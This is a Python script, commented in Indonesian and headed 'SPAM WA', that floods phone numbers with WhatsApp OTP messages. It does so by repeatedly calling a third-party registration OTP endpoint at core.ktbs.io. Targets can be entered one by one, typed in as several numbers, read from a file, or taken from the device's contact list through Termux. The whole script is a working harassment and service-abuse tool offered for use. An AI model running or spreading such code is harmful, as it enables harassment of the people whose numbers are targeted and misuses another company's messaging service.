import requests,os,time,json
# Tidak ada author Untuk Sc ini
# Recode!, dosa Tanggung Sendiri
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
class spam:
	def __init__(self, url, nomer):
		self.nomer = nomer
		self.url = url
	def spam(self):
		hasil=requests.get(self.url)
		if hasil.status_code == 200:
			return f'\033[1;37mSpamm {self.nomer} \033[1;32mSukses!\033[0m'
		elif hasil.status_code == 500:
			return f'\033[1;37mSpamm {self.nomer} \033[1;31mGagal!\033[0m'
def apakah():
	while True:
		lan=str(input(k+'\tapakah ingin lanjut Y/T : '+h))
		if( lan == 'Y' or lan == 'y'):
			main()
		elif(lan == 't' or lan == 'T'):
			print(p)
			break
		else:
			continue
def files():
	fil=str(input(k+'\tfile : '+h))
	if fil in os.listdir(os.getcwd()):
		l=open(fil,'r').readlines()
		js=int(input(k+'\tjumlah spam : '+h))
		dly=int(input(k+'\tdelay : '+h))
		for pp in range(js):
			for d in range(len(l)-1):
				io=l[d].split('\n')[0]
				z=spam(f'https://core.ktbs.io/v2/user/registration/otp/{io}',io)
				print('\t'+z.spam())
			time.sleep(dly)
		apakah()
	else:
		print(m+f'\tfile {fil} tidak ada')
def single():
	nomer=str(input(k+'\tWa : '+h))
	jm=int(input(k+'\tjumlah spam : '+h))
	dly=int(input(k+'\tdelay : '+h))
	for oo in range(jm):
		z=spam(f'https://core.ktbs.io/v2/user/registration/otp/{nomer}',nomer)
		print('\t'+z.spam())
		time.sleep(dly)
	apakah()
def multi():
	nomer=[]
	jum=int(input(k+'\tjumlah nomer : '+h))
	for i in range(jum):
		nomer.append(str(input(k+f'\tnomer Wa -{i+1} : '+h)))
	spm=int(input(k+'\tjumlah spam : '+h))
	dly=int(input(k+'delay : '+h))
	kk=len(nomer)
	for i in range(spm):
		for ss in range(kk):
			z=spam(f'https://core.ktbs.io/v2/user/registration/otp/{nomer[ss]}',nomer[ss])
			print('\t'+z.spam())
		time.sleep(dly)
	apakah()
def logo():
	os.system('clear')
	return u+'''
  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓    █     █░ ▄▄▄      
▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒   ▓█░ █ ░█░▒████▄    
░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░   ▒█░ █ ░█ ▒██  ▀█▄  
  ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██    ░█░ █ ░█ ░██▄▄▄▄██ 
▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒   ░░██▒██▓  ▓█   ▓██▒
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░   ░ ▓░▒ ▒   ▒▒   ▓▒█░
░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░     ▒ ░ ░    ▒   ▒▒ ░
░  ░  ░  ░░         ░   ▒   ░      ░        ░   ░    ░   ▒   
      ░                 ░  ░       ░          ░          ░  ░
                                                             
'''
def termux():
	os.system('termux-contact-list > .contact')
	po=json.loads(open('.contact','r').read())
	lenpo=len(po)
	for poh in range(lenpo):
		print(m+str(poh+1)+' '+k+po[poh]['name'])
	nj=po[int(input(u+'\tpilih : '+h))-1]['number']
	dly=int(input(u+'\tdelay : '+h))
	for w in range(int(input(u+'\tjumlah spam : '+h))):
		z=spam(f'https://core.ktbs.io/v2/user/registration/otp/{nj}',nj)
		print('\t'+z.spam())
		time.sleep(dly)
	apakah()
def main():
	print(logo())
	print(k+'Mode\n'+m+'-'*30+b+'\n\t1. Single Nomer\n\t2. Multi Nomer\n\t3. File List Number\n\t4. my contact (memerlukan termux-api)\n'+m+'-'*30)
	pil=str(input(k+'\tpilih : '+h))
	if( pil == '1' or pil == '01'):
		single()
	elif( pil == '2' or pil == '02'):
		multi()
	elif( pil == '3' or pil == '03'):
		files()
	elif( pil == '4' or pil == '04'):
		termux()
	else:
		print(m+'yg anda pilih tidak ada')
		time.sleep(2)
		main()
main()
